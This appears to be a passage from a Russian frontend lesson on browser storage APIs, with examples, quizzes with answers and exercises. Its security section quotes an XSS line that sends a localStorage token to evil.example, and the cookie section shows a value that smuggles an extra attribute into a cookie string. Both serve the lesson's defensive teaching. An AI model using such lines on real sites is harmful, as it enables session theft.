@@ -1,0 +1,922 @@
+---
+title: 'Хранилища браузера: localStorage, sessionStorage, cookies, IndexedDB, Cache Storage'
+description: Чем отличаются хранилища браузера, как ими пользоваться, где хранить токены и настройки и какие ошибки встречаются чаще всего
+section: frontend
+order: 2
+level: middle
+tags: [localStorage, sessionStorage, cookies, IndexedDB, Cache Storage, security]
+---
+
+import Callout from '@/components/blocks/Callout.tsx';
+import Quiz from '@/components/blocks/Quiz.tsx';
+import Task from '@/components/blocks/Task.astro';
+
+Браузер умеет хранить данные на стороне пользователя — тему оформления, черновик формы, корзину, данные для
+офлайн-режима, сессию. Для этого есть пять основных механизмов, и они **очень разные**: одни синхронные,
+другие асинхронные, одни хранят только строки, другие — целые объекты и файлы, а cookie вообще уходят
+на сервер с каждым запросом.
+
+| Хранилище | Коротко |
+|---|---|
+| `localStorage` | строки «ключ → значение», живут, пока их не удалят |
+| `sessionStorage` | то же, но отдельно для каждой вкладки и до её закрытия |
+| cookies | маленькие строки, которые браузер сам отправляет на сервер |
+| IndexedDB | асинхронная база данных для больших структурированных данных |
+| Cache Storage | пары «запрос → ответ», в основном для Service Worker |
+
+Разберём каждое, а в конце — как выбрать и как **не** надо.
+
+## 1. localStorage
+
+`localStorage` — синхронное хранилище пар «строка → строка». Данные привязаны к **origin** (схема + домен + порт)
+и не имеют срока жизни: они переживают перезагрузку, закрытие браузера и перезапуск компьютера.
+
+```js
+localStorage.setItem('theme', 'dark'); // записать
+localStorage.getItem('theme'); // 'dark'
+localStorage.getItem('missing'); // null — ключа нет
+localStorage.removeItem('theme'); // удалить один ключ
+localStorage.clear(); // удалить всё для этого origin
+
+localStorage.length; // количество ключей
+localStorage.key(0); // имя ключа по индексу — для перебора
+```
+
+`https://example.com`, `http://example.com` и `https://example.com:8080` — три разных origin с тремя разными
+хранилищами. А вот все страницы одного origin видят **одно и то же** хранилище.
+
+### Только строки: JSON.stringify и JSON.parse
+
+Любое значение перед записью приводится к строке через `String()`. С числами это незаметно, с объектами —
+катастрофа:
+
+```js
+localStorage.setItem('count', 5);
+localStorage.getItem('count'); // '5' — строка, а не число
+
+localStorage.setItem('user', { name: 'Аня' });
+localStorage.getItem('user'); // '[object Object]' — данные потеряны
+
+localStorage.setItem('ids', [1, 2]);
+localStorage.getItem('ids'); // '1,2'
+```
+
+Структуры сериализуют в JSON:
+
+```js
+const user = { name: 'Аня', roles: ['admin'] };
+
+localStorage.setItem('user', JSON.stringify(user));
+const saved = JSON.parse(localStorage.getItem('user')); // { name: 'Аня', roles: ['admin'] }
+```
+
+Помните ограничения JSON — не всё переживает «круг» `stringify → parse`:
+
+```js
+JSON.stringify({ date: new Date(0), skip: undefined, map: new Map([[1, 2]]), set: new Set([1]), nan: NaN });
+// '{"date":"1970-01-01T00:00:00.000Z","map":{},"set":{},"nan":null}'
+```
+
+| Значение | После `JSON.stringify → JSON.parse` |
+|---|---|
+| `Date` | строка ISO — дату нужно восстановить через `new Date(str)` |
+| `undefined`, функции | свойство пропадает |
+| `Map`, `Set` | пустой объект `{}` |
+| `NaN`, `Infinity` | `null` |
+
+Отсутствующий ключ даёт `null`, а `JSON.parse(null)` тоже возвращает `null` — это удобно для значения по умолчанию:
+
+```js
+const settings = JSON.parse(localStorage.getItem('settings')) ?? { fontSize: 16 };
+```
+
+### Квота и исключения
+
+Объём ограничен — порядка **5 МБ на origin** (точное число зависит от браузера). При переполнении `setItem`
+бросает `DOMException` с именем `QuotaExceededError`.
+
+Кроме того, хранилище может быть **недоступно вовсе**: пользователь запретил сайтам сохранять данные, страница
+открыта в стороннем iframe с заблокированными cookie, старый Safari в приватном режиме выставлял нулевую квоту.
+В таких случаях исключение бросает `setItem`, а иногда даже само обращение к `window.localStorage`.
+Поэтому код, который работает с хранилищем, оборачивают в `try/catch`:
+
+```js
+function safeSet(key, value) {
+  try {
+    localStorage.setItem(key, value);
+    return true;
+  } catch (error) {
+    if (error instanceof DOMException && error.name === 'QuotaExceededError') {
+      console.warn('Хранилище переполнено');
+    }
+    return false; // приложение продолжает работать без сохранения
+  }
+}
+```
+
+### Событие storage: синхронизация вкладок
+
+Когда одна вкладка меняет `localStorage`, в **других** вкладках и окнах того же origin срабатывает событие `storage`.
+В самом документе, который сделал изменение, событие **не** приходит.
+
+```js
+// Вкладка B
+window.addEventListener('storage', (event) => {
+  if (event.storageArea !== localStorage) return;
+
+  console.log(event.key); // 'theme' — какой ключ изменился (null после clear())
+  console.log(event.oldValue); // 'light'
+  console.log(event.newValue); // 'dark' (null, если ключ удалили)
+
+  if (event.key === 'theme') applyTheme(event.newValue);
+});
+
+// Вкладка A
+localStorage.setItem('theme', 'dark'); // во вкладке A обработчик не вызовется, во вкладке B — да
+```
+
+Так синхронизируют тему, выход из аккаунта («вышли в одной вкладке — вышли везде») и корзину.
+Для более сложного обмена сообщениями между вкладками есть `BroadcastChannel`.
+
+### Общий origin — общие ключи
+
+Если на одном origin живёт несколько приложений (например, учебный сайт со встроенными демо-приложениями),
+у них **одно** `localStorage`. Ключ `settings` одного приложения перезапишет `settings` другого. Решение —
+пространство имён в ключах и обёртка, которая заодно делает JSON и `try/catch`:
+
+```js
+function createStorage(namespace) {
+  const prefix = `${namespace}:`;
+
+  return {
+    get(key, fallback = null) {
+      try {
+        const raw = localStorage.getItem(prefix + key);
+        return raw === null ? fallback : JSON.parse(raw);
+      } catch {
+        return fallback; // хранилище недоступно или JSON испорчен
+      }
+    },
+    set(key, value) {
+      try {
+        localStorage.setItem(prefix + key, JSON.stringify(value));
+        return true;
+      } catch {
+        return false;
+      }
+    },
+    remove(key) {
+      try {
+        localStorage.removeItem(prefix + key);
+      } catch {}
+    },
+  };
+}
+
+const todoStorage = createStorage('todo-app');
+todoStorage.set('items', [{ id: 1, text: 'Купить хлеб' }]); // ключ 'todo-app:items'
+todoStorage.get('items', []); // [{ id: 1, text: 'Купить хлеб' }]
+```
+
+## 2. sessionStorage
+
+API у `sessionStorage` точно такой же, как у `localStorage`: `setItem`, `getItem`, `removeItem`, `clear`, только строки.
+Отличаются область видимости и время жизни:
+
+- данные привязаны к origin **и к вкладке**: две вкладки одного сайта видят разные `sessionStorage`;
+- данные переживают перезагрузку страницы, но удаляются, когда вкладку закрывают;
+- если вкладку «дублировать», новая получает **копию** данных, дальше они живут независимо.
+
+```js
+// Сохраняем черновик формы — переживёт случайный F5, но не засорит хранилище навсегда
+textarea.addEventListener('input', () => {
+  sessionStorage.setItem('draft', textarea.value);
+});
+
+textarea.value = sessionStorage.getItem('draft') ?? '';
+```
+
+Типичные применения: шаг многошаговой формы, позиция прокрутки, состояние фильтров, которое не нужно
+переносить в другие вкладки. Квота и исключения — такие же, как у `localStorage`, так что `try/catch` нужен и здесь.
+
+## 3. Cookies
+
+Cookie — маленькая именованная строка, которую браузер хранит для домена и **автоматически прикладывает
+к каждому HTTP-запросу** на этот домен в заголовке `Cookie`. Это главное отличие от всех остальных хранилищ:
+cookie придуманы для общения с сервером, а не для хранения данных фронтенда.
+
+### Cookie от сервера: Set-Cookie
+
+Чаще всего cookie ставит сервер — заголовком ответа:
+
+```http
+HTTP/1.1 200 OK
+Set-Cookie: sessionId=abc123; Path=/; Max-Age=86400; Secure; HttpOnly; SameSite=Lax
+```
+
+Браузер запоминает cookie и дальше сам отправляет её в запросах на этот сайт:
+
+```http
+GET /api/profile HTTP/1.1
+Cookie: sessionId=abc123
+```
+
+### Атрибуты
+
+| Атрибут | Что делает |
+|---|---|
+| `Expires=<дата>` | срок жизни до конкретной даты (формат UTC-строки) |
+| `Max-Age=<секунды>` | срок жизни в секундах; важнее `Expires`, если указаны оба; `0` — удалить |
+| без `Expires` и `Max-Age` | сессионная cookie — удаляется при закрытии браузера (браузер с восстановлением сессии может её сохранить) |
+| `Path=/` | для каких путей отправлять; по умолчанию — «каталог» текущего URL |
+| `Domain=example.com` | отправлять и на поддомены; без атрибута — только на точный хост |
+| `Secure` | только по HTTPS |
+| `HttpOnly` | недоступна из JavaScript — `document.cookie` её не видит; ставится только сервером |
+| `SameSite=Strict` | не отправлять ни в каких запросах с других сайтов, даже при переходе по ссылке |
+| `SameSite=Lax` | с других сайтов — только при обычной навигации верхнего уровня (переход по ссылке, GET) |
+| `SameSite=None` | отправлять всегда; требует `Secure` |
+
+<Callout type="info">
+  Если `SameSite` не указан, Chromium-браузеры по умолчанию ведут себя как с `Lax`. Другие браузеры исторически
+  обрабатывали отсутствие атрибута иначе, поэтому указывайте `SameSite` явно.
+</Callout>
+
+### document.cookie — странный API
+
+Из JavaScript cookie доступны через свойство `document.cookie`, и оно ведёт себя совсем не как обычное свойство:
+
+- **чтение** возвращает одну строку со всеми доступными cookie в формате `имя=значение; имя2=значение2` — без атрибутов;
+- **присваивание** не заменяет строку целиком, а добавляет или обновляет **одну** cookie.
+
+```js
+document.cookie = 'theme=dark; Max-Age=31536000; Path=/; SameSite=Lax';
+document.cookie = 'lang=ru; Path=/';
+
+document.cookie; // 'theme=dark; lang=ru' — атрибутов не видно
+```
+
+Значения нельзя писать «как есть»: точка с запятой отделяет атрибуты, а пробелы, запятые и кавычки стандарт
+в значении не допускает. Кодируйте через `encodeURIComponent`:
+
+```js
+const city = 'Санкт-Петербург; admin=1';
+
+document.cookie = `city=${city}`; // ✗ значение — 'Санкт-Петербург', а admin=1 браузер примет за атрибут
+document.cookie = `city=${encodeURIComponent(city)}; Path=/`; // ✓
+
+encodeURIComponent('Аня; admin=1'); // '%D0%90%D0%BD%D1%8F%3B%20admin%3D1'
+```
+
+Чтобы **удалить** cookie, её перезаписывают с `Max-Age=0` (или `Expires` в прошлом) — с тем же именем,
+`Path` и `Domain`, что при создании. Иначе браузер посчитает это другой cookie:
+
+```js
+document.cookie = 'theme=; Max-Age=0; Path=/';
+```
+
+### Ограничения
+
+- Около **4 КБ на одну cookie**, и число cookie на домен тоже ограничено (зависит от браузера).
+- Каждая cookie уходит с **каждым** запросом на домен — включая картинки, скрипты и стили. 20 cookie по 3 КБ — это
+  десятки килобайт лишнего трафика на каждый запрос.
+- Cookie не разделяются по портам: `localhost:3000` и `localhost:5173` видят одни и те же cookie.
+- Сторонние cookie (из iframe и запросов на чужой домен) браузеры ограничивают всё сильнее.
+
+<Callout type="tip">
+  Хранить в cookie данные для фронтенда не нужно — для этого есть `localStorage`. Cookie — для того, что должен
+  видеть сервер: идентификатор сессии, язык для серверного рендеринга, согласие на cookie.
+</Callout>
+
+## 4. IndexedDB
+
+IndexedDB — настоящая база данных в браузере:
+
+- **асинхронная** — не блокирует основной поток;
+- хранит почти любые значения через structured clone: объекты, массивы, `Date`, `Map`, `Set`, `Blob`, `File`,
+  `ArrayBuffer` (но не функции и не DOM-узлы — будет `DataCloneError`);
+- объём на порядки больше, чем у `localStorage`, — зависит от браузера и свободного места на диске;
+- работает в Web Worker и Service Worker.
+
+Основные понятия:
+
+| Понятие | Что это |
+|---|---|
+| база (database) | у origin может быть несколько баз; у каждой есть номер версии |
+| хранилище объектов (object store) | аналог таблицы; записи хранятся по ключу |
+| ключ (key) | поле объекта (`keyPath`) или автоинкремент |
+| индекс (index) | позволяет искать записи по другому полю, не по ключу |
+| транзакция | любое чтение и запись идут внутри транзакции `readonly` или `readwrite` |
+
+### Сырой API
+
+Родной API построен на событиях, а не на промисах, поэтому выглядит многословно:
+
+```js
+const request = indexedDB.open('shop', 1);
+
+// Вызывается при первом открытии и при увеличении версии — только здесь можно менять схему
+request.onupgradeneeded = () => {
+  const db = request.result;
+  const products = db.createObjectStore('products', { keyPath: 'id' });
+  products.createIndex('byCategory', 'category');
+};
+
+request.onsuccess = () => {
+  const db = request.result;
+
+  // Запись
+  const tx = db.transaction('products', 'readwrite');
+  const store = tx.objectStore('products');
+  store.put({ id: 1, title: 'Чайник', category: 'кухня', price: 2500 });
+  store.put({ id: 2, title: 'Лампа', category: 'свет', price: 1200 });
+  store.put({ id: 3, title: 'Сковорода', category: 'кухня', price: 3100 });
+
+  tx.oncomplete = () => {
+    // Чтение по индексу
+    const query = db.transaction('products').objectStore('products').index('byCategory').getAll('кухня');
+    query.onsuccess = () => console.log(query.result.map((p) => p.title)); // ['Чайник', 'Сковорода']
+  };
+};
+
+request.onerror = () => console.error(request.error);
+```
+
+`add` добавляет запись и падает с `ConstraintError`, если ключ уже есть; `put` добавляет или перезаписывает.
+
+<Callout type="warning">
+  Транзакция завершается сама, как только у неё не остаётся невыполненных запросов. Если внутри транзакции
+  подождать что-то постороннее — `fetch`, `setTimeout`, — к моменту следующего запроса она уже будет закрыта,
+  и вы получите `TransactionInactiveError`. Сначала получите данные, потом открывайте транзакцию.
+</Callout>
+
+### Обёртка idb
+
+На практике сырой API почти никто не пишет руками. Маленькая библиотека [`idb`](https://github.com/jakearchibald/idb)
+(около 1 КБ) превращает запросы в промисы, и код становится обычным `async/await`:
+
+```js
+import { openDB } from 'idb';
+
+const db = await openDB('shop', 1, {
+  upgrade(db) {
+    const products = db.createObjectStore('products', { keyPath: 'id' });
+    products.createIndex('byCategory', 'category');
+  },
+});
+
+await db.put('products', { id: 1, title: 'Чайник', category: 'кухня', price: 2500 });
+await db.get('products', 1); // { id: 1, title: 'Чайник', category: 'кухня', price: 2500 }
+await db.getAllFromIndex('products', 'byCategory', 'кухня'); // [{ id: 1, … }]
+
+// Несколько операций в одной транзакции
+const tx = db.transaction('products', 'readwrite');
+await Promise.all([tx.store.put({ id: 2, title: 'Лампа', category: 'свет' }), tx.done]);
+```
+
+Про промисы и `async/await` — в уроках [Promise](/learn/js/promise) и [async/await](/learn/js/async-await).
+
+## 5. Cache Storage
+
+Cache Storage хранит пары **`Request` → `Response`** — по сути, сохранённые HTTP-ответы целиком, с заголовками
+и телом. Его главный пользователь — Service Worker: он кладёт в кэш HTML, скрипты, стили и ответы API, а потом
+отдаёт их без сети. Подробно — в уроке [Service Worker и Web App Manifest](/learn/frontend/service-worker-manifest).
+
+API промисный, а объект `caches` доступен и в Service Worker, и на обычной странице — но только в
+**безопасном контексте** (HTTPS или `localhost`):
+
+```js
+const cache = await caches.open('api-v1'); // открыть или создать кэш с именем
+
+// Сохранить ответ
+const response = await fetch('/api/products');
+await cache.put('/api/products', response.clone()); // clone — тело ответа читается только один раз
+const products = await response.json();
+
+// Достать позже
+const cached = await cache.match('/api/products'); // Response или undefined
+if (cached) {
+  const data = await cached.json();
+}
+
+// Скачать и сохранить одним вызовом (отклоняется, если ответ не 2xx)
+await cache.addAll(['/', '/styles.css', '/app.js']);
+
+// Управление кэшами
+await cache.delete('/api/products'); // удалить одну запись
+await caches.keys(); // ['api-v1', …] — имена всех кэшей
+await caches.delete('api-v1'); // удалить кэш целиком
+```
+
+<Callout type="warning">
+  Cache Storage — это **не** HTTP-кэш браузера. Заголовки `Cache-Control` и `Expires` на него не действуют:
+  запись живёт, пока вы её не удалите (или браузер не вычистит данные сайта). Устаревшие кэши удаляйте сами —
+  обычно по имени с версией, как `api-v1`. Сохранять можно только запросы `GET`.
+</Callout>
+
+## 6. Сравнение
+
+| | `localStorage` | `sessionStorage` | cookies | IndexedDB | Cache Storage |
+|---|---|---|---|---|---|
+| Объём | ~5 МБ на origin | ~5 МБ на origin | ~4 КБ на cookie | большой, общая квота origin | большой, общая квота origin |
+| Время жизни | пока не удалят | до закрытия вкладки | `Expires`/`Max-Age` или до закрытия браузера | пока не удалят | пока не удалят |
+| API | синхронный | синхронный | синхронный (`document.cookie`) | асинхронный (события) | асинхронный (промисы) |
+| Типы данных | строки | строки | строки | structured clone: объекты, `Date`, `Blob`… | `Request` → `Response` |
+| Уходит на сервер сам | нет | нет | **да**, с каждым запросом | нет | нет |
+| Доступ из Service Worker | нет | нет | нет `document.cookie` | да | да |
+| Область видимости | origin | origin + вкладка | домен + путь | origin | origin |
+| Доступ из JS | да | да | да, кроме `HttpOnly` | да | да |
+
+IndexedDB и Cache Storage делят общую квоту origin. Узнать, сколько занято и сколько доступно, можно через
+`await navigator.storage.estimate()`, а попросить браузер не удалять данные при нехватке места —
+через `navigator.storage.persist()`.
+
+<Callout type="info">
+  Всё, что хранится в браузере, может исчезнуть: пользователь чистит данные сайтов, браузер вытесняет данные
+  при нехватке места, Safari может удалить данные сайта, который давно не открывали. Клиентское хранилище —
+  это кэш и удобство, а не надёжная база. Важное храните на сервере.
+</Callout>
+
+## 7. Безопасность
+
+### Токены — не в localStorage
+
+Любой JavaScript на странице читает `localStorage` целиком. Если на сайте есть XSS-уязвимость — через
+непроверенный HTML, взломанную npm-зависимость, сторонний скрипт аналитики, — злоумышленник одной строкой
+заберёт токен и сможет пользоваться им со своего компьютера:
+
+```js
+// Код злоумышленника, внедрённый через XSS
+fetch('https://evil.example/steal?t=' + localStorage.getItem('accessToken'));
+```
+
+Для сессии надёжнее cookie с атрибутами `HttpOnly; Secure; SameSite=Lax` (или `Strict`), которую ставит сервер:
+
+- `HttpOnly` — JavaScript её не видит, украсть значение через XSS нельзя;
+- `Secure` — не уйдёт по незашифрованному HTTP;
+- `SameSite` — не уйдёт с запросами, которые инициировал чужой сайт, — защита от CSRF.
+
+<Callout type="danger">
+  `HttpOnly` не делает XSS безвредным: внедрённый скрипт всё ещё может отправлять запросы от имени пользователя,
+  пока он на странице. Но он не может унести сессию с собой. Защищаться от самой XSS всё равно нужно.
+</Callout>
+
+### Персональные данные
+
+Не храните на клиенте больше, чем нужно: паспортные данные, номера карт, медицинскую информацию. Всё, что лежит
+в хранилищах, видно любому скрипту на странице и любому, кто сядет за компьютер и откроет DevTools
+(вкладка Application). Про DevTools — в уроке [Отладка](/learn/frontend/debugging).
+
+## Как не надо
+
+**Объекты без JSON:**
+
+```js
+localStorage.setItem('cart', cart); // ✗ сохранится '[object Object]'
+localStorage.setItem('cart', JSON.stringify(cart)); // ✓
+```
+
+**Считать, что хранилище есть всегда:**
+
+```js
+const theme = localStorage.getItem('theme'); // ✗ в запрещающем режиме — исключение, приложение падает
+
+let theme = 'light'; // ✓ значение по умолчанию и try/catch
+try {
+  theme = localStorage.getItem('theme') ?? 'light';
+} catch {}
+```
+
+**Синхронный localStorage для больших данных в горячем коде:**
+
+```js
+window.addEventListener('scroll', () => {
+  localStorage.setItem('feed', JSON.stringify(hugeFeed)); // ✗ сериализация и запись на диск блокируют поток на каждом событии
+});
+
+// ✓ большие данные — в IndexedDB; частые записи — реже (debounce) или по событию pagehide
+```
+
+**Токены в localStorage:**
+
+```js
+localStorage.setItem('accessToken', token); // ✗ доступен любому скрипту на странице
+// ✓ сессия в cookie HttpOnly; Secure; SameSite, которую ставит сервер
+```
+
+**Огромные cookie:**
+
+```js
+document.cookie = `cart=${encodeURIComponent(JSON.stringify(cart))}`; // ✗ упрётся в 4 КБ и уйдёт с каждым запросом
+// ✓ корзина — в localStorage или на сервере, в cookie — максимум её id
+```
+
+**Cookie-строка без кодирования:**
+
+```js
+document.cookie = `name=${userName}`; // ✗ «;» или «,» в имени сломают cookie
+document.cookie = `name=${encodeURIComponent(userName)}; Path=/`; // ✓
+```
+
+**Удаление без Path:**
+
+```js
+// Cookie создана с Path=/
+document.cookie = 'theme=; Max-Age=0'; // ✗ на странице /settings/profile удаляет cookie с Path=/settings — а её нет
+document.cookie = 'theme=; Max-Age=0; Path=/'; // ✓ те же Path и Domain, что при создании
+```
+
+**Ждать постороннего внутри транзакции IndexedDB:**
+
+```js
+const tx = db.transaction('products', 'readwrite');
+const data = await fetch('/api/products').then((r) => r.json()); // ✗ транзакция успеет закрыться
+tx.objectStore('products').put(data); // TransactionInactiveError
+
+// ✓ сначала fetch, потом транзакция
+```
+
+## Как выбрать
+
+| Задача | Хранилище |
+|---|---|
+| Тема, язык интерфейса, свёрнутые панели | `localStorage` |
+| Черновик формы, шаг мастера, фильтры одной вкладки | `sessionStorage` |
+| Сессия пользователя, авторизация | cookie `HttpOnly; Secure; SameSite` от сервера |
+| То, что должен знать сервер при каждом запросе (язык для SSR) | cookie |
+| Большие списки, офлайн-данные, файлы, поиск по полям | IndexedDB (с `idb`) |
+| Офлайн-режим, кэш статики и ответов API | Cache Storage в Service Worker |
+| Синхронизация вкладок | событие `storage` или `BroadcastChannel` |
+| Состояние, которое нужно только пока открыта страница | переменная в памяти или стейт-менеджер — хранилище не нужно |
+
+Про состояние в памяти — в уроке [Стейт-менеджер](/learn/architecture/state-manager).
+
+## Проверь себя
+
+<Quiz client:visible id="frontend/browser-storage/number-as-string" options={['6', "'51'", "'6'", 'NaN']} answer={1}>
+  Что выведет код?
+
+  ```js
+  localStorage.setItem('count', 5);
+  console.log(localStorage.getItem('count') + 1);
+  ```
+
+  <Fragment slot="explanation">
+    `localStorage` хранит только строки: число `5` превратилось в `'5'`. Строка плюс число — конкатенация,
+    получается `'51'`. Читая числа, приводите их явно: `Number(localStorage.getItem('count'))`.
+  </Fragment>
+</Quiz>
+
+<Quiz
+  client:visible
+  id="frontend/browser-storage/object-without-json"
+  options={["{ name: 'Аня' }", "'Аня'", 'null', 'SyntaxError']}
+  answer={3}
+>
+  Что произойдёт?
+
+  ```js
+  localStorage.setItem('user', { name: 'Аня' });
+  const user = JSON.parse(localStorage.getItem('user'));
+  ```
+
+  <Fragment slot="explanation">
+    При записи объект приведён к строке через `String()` — сохранилось `'[object Object]'`. Это не JSON,
+    поэтому `JSON.parse` бросает `SyntaxError`. Записывать нужно `JSON.stringify(user)`.
+  </Fragment>
+</Quiz>
+
+<Quiz client:visible id="frontend/browser-storage/date-roundtrip" options={["'object'", "'string'", "'number'", "'undefined'"]} answer={1}>
+  Что выведет код?
+
+  ```js
+  localStorage.setItem('task', JSON.stringify({ createdAt: new Date() }));
+  const task = JSON.parse(localStorage.getItem('task'));
+  console.log(typeof task.createdAt);
+  ```
+
+  <Fragment slot="explanation">
+    `JSON.stringify` превращает `Date` в строку ISO, а `JSON.parse` не знает, что это была дата, и оставляет строку.
+    Восстанавливайте вручную: `new Date(task.createdAt)`.
+  </Fragment>
+</Quiz>
+
+<Quiz
+  client:visible
+  id="frontend/browser-storage/storage-event"
+  options={['Только во вкладке A', 'Только во вкладке B', 'В обеих вкладках', 'Ни в одной']}
+  answer={1}
+>
+  Сайт открыт в двух вкладках, A и B, и в обеих подписан обработчик `storage`. Вкладка A выполняет
+  `localStorage.setItem('theme', 'dark')`. Где сработает обработчик?
+
+  ```js
+  window.addEventListener('storage', (event) => {
+    console.log(event.key, event.newValue);
+  });
+  ```
+
+  <Fragment slot="explanation">
+    Событие `storage` приходит в **другие** документы того же origin, а не в тот, который изменил хранилище.
+    Вкладка A и так знает, что записала, — поэтому событие удобно для синхронизации вкладок.
+  </Fragment>
+</Quiz>
+
+<Quiz client:visible id="frontend/browser-storage/cookie-assign" options={["'b=2'", "'a=1; b=2'", "'a=1'", "'a=1b=2'"]} answer={1}>
+  Что выведет код, если до него cookie у сайта не было?
+
+  ```js
+  document.cookie = 'a=1';
+  document.cookie = 'b=2';
+  console.log(document.cookie);
+  ```
+
+  <Fragment slot="explanation">
+    Присваивание `document.cookie` не заменяет всю строку, а добавляет или обновляет одну cookie. После двух
+    присваиваний их две, и чтение возвращает обе через `; `.
+  </Fragment>
+</Quiz>
+
+<Quiz
+  client:visible
+  id="frontend/browser-storage/delete-cookie-path"
+  options={['Cookie theme удалится', 'Cookie theme останется', 'Появится вторая cookie theme со значением пустой строки', 'TypeError']}
+  answer={1}
+>
+  Cookie создали так: `document.cookie = 'theme=dark; Path=/'`. Затем на странице `/settings/profile` выполнили код.
+  Что будет с cookie `theme`?
+
+  ```js
+  document.cookie = 'theme=; Max-Age=0';
+  ```
+
+  <Fragment slot="explanation">
+    Без `Path` браузер берёт путь по умолчанию — «каталог» текущего URL, здесь `/settings`. Cookie
+    `theme` с `Path=/settings` не существует, а новая с `Max-Age=0` сразу истекает. Исходная cookie с `Path=/`
+    не тронута. Удалять нужно с теми же `Path` и `Domain`: `'theme=; Max-Age=0; Path=/'`.
+  </Fragment>
+</Quiz>
+
+<Quiz
+  client:visible
+  id="frontend/browser-storage/token-storage"
+  options={[
+    'В localStorage — переживёт перезапуск браузера',
+    'В sessionStorage — удалится при закрытии вкладки',
+    'В cookie HttpOnly; Secure; SameSite, которую ставит сервер',
+    'В IndexedDB — там данные асинхронные',
+  ]}
+  answer={2}
+>
+  Где безопаснее всего хранить идентификатор сессии, если на сайте случится XSS?
+
+  <Fragment slot="explanation">
+    `localStorage`, `sessionStorage` и IndexedDB читает любой скрипт на странице — внедрённый через XSS тоже.
+    Cookie с `HttpOnly` недоступна из JavaScript, `Secure` не пускает её в HTTP, `SameSite` защищает от CSRF.
+  </Fragment>
+</Quiz>
+
+<Quiz
+  client:visible
+  id="frontend/browser-storage/service-worker-access"
+  options={['localStorage', 'sessionStorage', 'IndexedDB и Cache Storage', 'document.cookie']}
+  answer={2}
+>
+  Какие хранилища доступны внутри Service Worker?
+
+  <Fragment slot="explanation">
+    Service Worker работает без документа, а синхронный Web Storage в воркерах не предоставляется, поэтому
+    `localStorage`, `sessionStorage` и `document.cookie` там нет. Асинхронные IndexedDB и Cache Storage — есть,
+    поэтому офлайн-данные хранят именно в них.
+  </Fragment>
+</Quiz>
+
+## Задачи
+
+<Task title="Настройки со значениями по умолчанию" level="easy">
+  Напишите `loadSettings()` и `saveSettings(settings)`. Настройки хранятся в `localStorage` под ключом
+  `'settings'`. `loadSettings` возвращает сохранённые значения поверх значений по умолчанию, а если хранилище
+  недоступно или JSON испорчен — просто значения по умолчанию. Ни одна функция не должна бросать исключений.
+
+  ```js
+  const DEFAULTS = { theme: 'light', fontSize: 16 };
+
+  loadSettings(); // { theme: 'light', fontSize: 16 } — ничего не сохранено
+  saveSettings({ theme: 'dark' });
+  loadSettings(); // { theme: 'dark', fontSize: 16 }
+  ```
+
+  <Fragment slot="solution">
+    ```js
+    const DEFAULTS = { theme: 'light', fontSize: 16 };
+    const KEY = 'settings';
+
+    function loadSettings() {
+      try {
+        const saved = JSON.parse(localStorage.getItem(KEY)); // null, если ключа нет
+        return { ...DEFAULTS, ...saved };
+      } catch {
+        return { ...DEFAULTS };
+      }
+    }
+
+    function saveSettings(settings) {
+      try {
+        localStorage.setItem(KEY, JSON.stringify(settings));
+      } catch {
+        // нет места или хранилище запрещено — работаем без сохранения
+      }
+    }
+    ```
+
+    Спред `...null` ничего не добавляет, поэтому отдельная проверка на отсутствующий ключ не нужна.
+    Слияние с `DEFAULTS` спасает и при обновлении приложения: если появится новая настройка, у старых
+    пользователей она получит значение по умолчанию. Возвращаем копию `DEFAULTS`, чтобы вызывающий код
+    не мог случайно изменить сами значения по умолчанию.
+  </Fragment>
+</Task>
+
+<Task title="Прочитать cookie" level="easy">
+  Напишите `getCookie(name)`: возвращает декодированное значение cookie или `null`. Учтите, что значение
+  может содержать `=`.
+
+  ```js
+  // document.cookie === 'theme=dark; city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; data=a=b'
+  getCookie('city'); // 'Москва'
+  getCookie('data'); // 'a=b'
+  getCookie('lang'); // null
+  ```
+
+  <Fragment slot="hint">
+    Разбейте строку по `'; '`, а каждую пару — по **первому** `=` через `indexOf`, а не `split('=')`.
+  </Fragment>
+
+  <Fragment slot="solution">
+    ```js
+    function getCookie(name) {
+      for (const pair of document.cookie.split('; ')) {
+        const index = pair.indexOf('=');
+        if (index === -1) continue;
+
+        if (pair.slice(0, index) === name) {
+          return decodeURIComponent(pair.slice(index + 1));
+        }
+      }
+      return null;
+    }
+    ```
+
+    `split('=')` разрезал бы `data=a=b` на три части и потерял бы конец значения. Пустой `document.cookie`
+    даёт массив `['']` — в нём нет `=`, цикл его пропускает. Если значение записали без кодирования и в нём
+    встретится одиночный `%`, `decodeURIComponent` бросит `URIError` — ещё одна причина всегда кодировать
+    значения при записи.
+  </Fragment>
+</Task>
+
+<Task title="Записать и удалить cookie" level="medium">
+  Напишите `setCookie(name, value, options)` и `deleteCookie(name, options)`. Имя и значение кодируются,
+  по умолчанию `Path=/`, `SameSite=Lax` и `Secure`; `maxAge` в секундах — необязательный.
+
+  ```js
+  setCookie('city', 'Санкт-Петербург', { maxAge: 3600 });
+  // document.cookie = 'city=%D0%A1%D0%B0...; Path=/; SameSite=Lax; Max-Age=3600; Secure'
+
+  deleteCookie('city');
+  ```
+
+  <Fragment slot="solution">
+    ```js
+    function setCookie(name, value, { maxAge, path = '/', sameSite = 'Lax', secure = true } = {}) {
+      let cookie = `${encodeURIComponent(name)}=${encodeURIComponent(value)}; Path=${path}; SameSite=${sameSite}`;
+
+      if (maxAge !== undefined) cookie += `; Max-Age=${maxAge}`;
+      if (secure) cookie += '; Secure';
+
+      document.cookie = cookie;
+    }
+
+    function deleteCookie(name, { path = '/' } = {}) {
+      setCookie(name, '', { maxAge: 0, path });
+    }
+    ```
+
+    `deleteCookie` принимает `path`, потому что удалить cookie можно только с тем же `Path` (и `Domain`),
+    что при создании. Проверка `maxAge !== undefined`, а не просто `if (maxAge)`, нужна, чтобы `maxAge: 0`
+    не потерялся — иначе удаление не сработает. `HttpOnly` здесь нет: из JavaScript такую cookie поставить
+    нельзя. А `Secure` требует HTTPS: на сайте по HTTP браузер такую cookie не сохранит.
+  </Fragment>
+</Task>
+
+<Task title="localStorage со сроком годности" level="medium">
+  У `localStorage` нет срока жизни. Напишите `setWithTTL(key, value, ttlMs)` и `getWithTTL(key)`: после
+  истечения срока `getWithTTL` возвращает `null` и удаляет запись. Испорченные записи тоже считаются
+  отсутствующими.
+
+  ```js
+  setWithTTL('rates', { usd: 92.5 }, 60 * 60 * 1000); // на час
+  getWithTTL('rates'); // { usd: 92.5 }
+  // через час
+  getWithTTL('rates'); // null
+  ```
+
+  <Fragment slot="solution">
+    ```js
+    function setWithTTL(key, value, ttlMs) {
+      const item = { value, expiresAt: Date.now() + ttlMs };
